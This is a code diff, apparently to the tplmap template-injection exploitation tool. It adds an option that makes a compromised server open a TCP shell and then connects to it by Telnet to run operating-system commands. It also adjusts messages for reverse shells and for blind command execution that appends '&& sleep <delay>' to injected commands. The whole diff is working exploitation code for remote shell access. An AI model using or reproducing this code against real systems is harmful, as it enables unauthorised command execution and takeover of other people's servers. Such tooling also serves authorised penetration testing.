@@ -8,6 +8,9 @@ from plugins.engines.jade import Jade
 from core.channel import Channel
 from utils.loggers import log
 from core.clis import Shell, MultilineShell
+import time
+import telnetlib
+import urlparse
 
 plugins = [
     Smarty,
@@ -98,18 +101,19 @@ def check_template_injection(channel):
     # If actions are not required, prints the advices and exit
     if not any(
             f for f,v in channel.args.items() if f in (
-                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'reverse_tcp_shell'
+                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'tcp_shell', 'reverse_tcp_shell'
             ) and v
         ):
 
         log.info(
-            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s%(tpl_shell)s%(reverse_tpl_shell)s""" % (
+            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s%(tcp_shell)s%(reverse_tcp_shell)s%(execute_blind)s""" % (
                 {
                  'execute': '\n    --os-cmd or --os-shell to access the underlying operating system' if channel.data.get('execute') else '',
                  'write': '\n    --upload LOCAL REMOTE to upload files to the server' if channel.data.get('write') else '',
                  'read': '\n    --download REMOTE LOCAL to download remote files' if channel.data.get('read') else '',
-                 'tpl_shell': '\n    --tcp-shell PORT to run an out-of-bound TCP shell on the remote PORT and connect to it' if channel.data.get('tpl_shell') else '',
-                 'reverse_tpl_shell': '\n    --reverse-tcp-shell HOST PORT to run a system shell and connect back to local HOST PORT' if channel.data.get('reverse_tpl_shell') else '',
+                 'tcp_shell': '\n    --tcp-shell PORT to run an out-of-bound TCP shell on the remote PORT and connect to it' if channel.data.get('tcp_shell') else '',
+                 'reverse_tcp_shell': '\n    --reverse-tcp-shell HOST PORT to run a system shell and connect back to local HOST PORT' if channel.data.get('reverse_tcp_shell') else '',
+                 'execute_blind': '\n    --os-cmd or --os-shell to execute blind shell commands on the underlying operating system' if channel.data.get('execute_blind') else '',
                  }
             )
         )
@@ -122,8 +126,8 @@ def check_template_injection(channel):
 
         # Check the status of command execution capabilities
         if channel.data.get('execute_blind'):
-            log.info("""Only blind injection has been found.""")
-            log.info("""Commands are executed as '<command> && sleep <delay>' and return True or False whether the delay has been triggered or not.""")
+            log.info("""Only blind injection has been found, command execution will not produce any output.""")
+            log.info("""A delay string as '&& sleep <delay>' will be appended to your command to return True or False whether it returns successfully or not.""")
 
             if channel.args.get('os_cmd'):
                 print current_plugin.execute_blind(channel.args.get('os_cmd'))
@@ -149,7 +153,7 @@ def check_template_injection(channel):
         if channel.data.get('engine'):
 
             if channel.data.get('blind'):
-                log.info("""Only blind execution has been found. The injected template code will no return any output.""")
+                log.info("""Only blind execution has been found. Injected template code will not produce any output.""")
                 call = current_plugin.inject
             else:
                 call = current_plugin.render
@@ -196,3 +200,41 @@ def check_template_injection(channel):
         else:
 
             log.error('No file download capabilities have been detected on the target')
+
+    # Connect to tcp shell
+    tcp_shell_port = channel.args.get('tcp_shell')
+    if tcp_shell_port:
+
+        if channel.data.get('tcp_shell'):
+
+            current_plugin.tcp_shell(tcp_shell_port)
+
+            # Give some time to spawn the shell
+            time.sleep(1)
+
+            urlparsed = urlparse.urlparse(channel.base_url)
+
+            if not urlparsed.hostname:
+                log.error("Error parsing hostname")
+                return
+
+            log.info('Connect to out-of-bound TCP shell spawned on port %i to run commands on the operating system' % (tcp_shell_port))
+
+            try:
+                telnetlib.Telnet(urlparsed.hostname, tcp_shell_port, timeout = 5).interact()
+
+                # If telnetlib does not rise an exception, we can assume that
+                # ended correctly and return from `run()`
+                return
+            except Exception as e:
+                log.error(
+                    "Error connecting to %s:%i %s" % (
+                        urlparsed.hostname,
+                        tcp_shell_port,
+                        e
+                    )
+                )
+
+        else:
+
+            log.error('No TCP shell opening capabilities have been detected on the target')
